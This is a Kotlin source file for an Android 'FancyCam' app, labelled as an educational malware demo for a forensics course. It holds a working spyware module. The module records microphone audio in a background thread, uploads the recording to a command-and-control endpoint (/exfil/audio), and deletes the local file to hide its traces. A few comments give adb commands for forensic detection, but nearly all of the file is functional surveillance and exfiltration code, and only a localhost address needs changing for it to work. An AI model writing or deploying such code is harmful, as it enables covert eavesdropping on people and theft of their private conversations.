package com.example.fancycam

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * EDUCATIONAL DEMO - Android Security & Forensics Course
 *
 * Demonstrates how malware captures microphone audio while the app
 * is in the foreground, then exfiltrates it to the C2 server.
 *
 * FOR USE IN SANDBOXED LAB ENVIRONMENTS ONLY.
 *
 * Forensic detection:
 *   - adb shell dumpsys audio | grep -A 5 "Active playback/recording"
 *   - adb shell dumpsys media.audio_flinger
 *   - AudioFlinger logs show recording source (MIC vs VOICE_CALL etc.)
 *   - Forensic timeline: recording start/stop times correlate with network uploads
 *
 * Educational note: MediaRecorder requires RECORD_AUDIO permission.
 * On Android 11+, a persistent notification appears during recording.
 * The forensic artifact is the audio file timestamp + network upload correlation.
 */
object MicrophoneCapture {

    private const val TAG = "MicrophoneCapture"

    private const val C2_SERVER_IP = "127.0.0.1"
    private const val C2_SERVER_PORT = 5000
    private const val C2_BASE_URL = "http://$C2_SERVER_IP:$C2_SERVER_PORT"

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)  // Longer timeout for audio upload
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private var recorder: MediaRecorder? = null
    private var isRecording = false

    /**
     * Starts microphone capture for a specified duration, then exfiltrates.
     *
     * Forensic timeline for students:
     *   T+0s: Recording starts (MediaRecorder initialized)
     *   T+30s: Audio file saved to cache
     *   T+31s: HTTP POST upload to C2 begins
     *   T+35s: Upload complete, recording deleted
     */
    fun startCaptureAndExfiltrate(context: Context, durationMs: Long = 30000L) {
        Thread {
            try {
                val outputFile = File(context.cacheDir, "mic_${System.currentTimeMillis()}.m4a")

                Log.d(TAG, "[EDUCATIONAL] Starting microphone capture (${durationMs}ms)...")

                // === Recording Setup ===
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(128000)
                    setAudioSamplingRate(44100)
                    setOutputFile(outputFile.absolutePath)
                    prepare()
                    start()
                }

                isRecording = true
                Log.d(TAG, "[EDUCATIONAL] Recording ACTIVE — source: MIC, format: AAC/MPEG_4")

                // === Capture Audio ===
                Thread.sleep(durationMs)

                // === Stop Recording ===
                recorder?.apply {
                    stop()
                    release()
                }
                recorder = null
                isRecording = false

                Log.d(TAG, "[EDUCATIONAL] Recording stopped — file: ${outputFile.name} (${outputFile.length() / 1024} KB)")

                // === Exfiltrate ===
                exfiltrateAudioFile(outputFile)

            } catch (e: Exception) {
                Log.e(TAG, "[EDUCATIONAL] Microphone capture failed", e)
                recorder?.release()
                recorder = null
                isRecording = false
            }
        }.start()
    }

    /**
     * Uploads recorded audio file to C2 server as multipart POST.
     */
    private fun exfiltrateAudioFile(file: File) {
        try {
            if (!file.exists()) {
                Log.w(TAG, "[EDUCATIONAL] Audio file not found")
                return
            }

            Log.d(TAG, "[EDUCATIONAL] Uploading audio to C2...")

            val multipart = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart(
                    "audio",
                    file.name,
                    file.asRequestBody("audio/mp4".toMediaType())
                )
                .build()

            val request = Request.Builder()
                .url("$C2_BASE_URL/exfil/audio")
                .post(multipart)
                .addHeader("User-Agent", "FancyCam-Educational/1.0")
                .build()

            httpClient.newCall(request).execute().use { response ->
                Log.d(TAG, "[EDUCATIONAL] Audio upload response: ${response.code}")
                if (response.isSuccessful) {
                    Log.i(TAG, "[EDUCATIONAL] Audio exfiltration successful")
                }
            }

            // Delete local file after exfiltration (forensic anti-technique)
            file.delete()
            Log.d(TAG, "[EDUCATIONAL] Local audio file deleted")

        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Audio exfiltration failed", e)
        }
    }

    /**
     * Stops recording immediately.
     */
    fun stopCapture() {
        if (isRecording) {
            try {
                recorder?.apply {
                    stop()
                    release()
                }
                recorder = null
                isRecording = false
                Log.d(TAG, "[EDUCATIONAL] Recording stopped by user")
            } catch (e: Exception) {
                Log.e(TAG, "[EDUCATIONAL] Failed to stop recording", e)
            }
        }
    }

    fun isRecording(): Boolean = isRecording
}
